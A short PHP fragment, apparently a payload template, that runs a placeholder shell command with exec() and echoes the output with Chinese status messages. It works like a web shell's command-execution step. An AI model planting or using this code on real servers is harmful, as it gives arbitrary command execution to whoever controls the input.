$shell = '{cmd}';
exec($shell, $result, $status);
if( $status ){
	$a = '正在执行命令：{cmd}...失败！';
} else {
	$a = '正在执行命令：{cmd}...成功！<br>';
	foreach ($result as $cmd) {
		$a .= mb_convert_encoding($cmd,'UTF-8',mb_detect_encoding($cmd, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5'))).'<br>';
	}
	$a .= '正在等待执行输入的指令...';
}
echo '<moleft>'.$a.'</moleft>';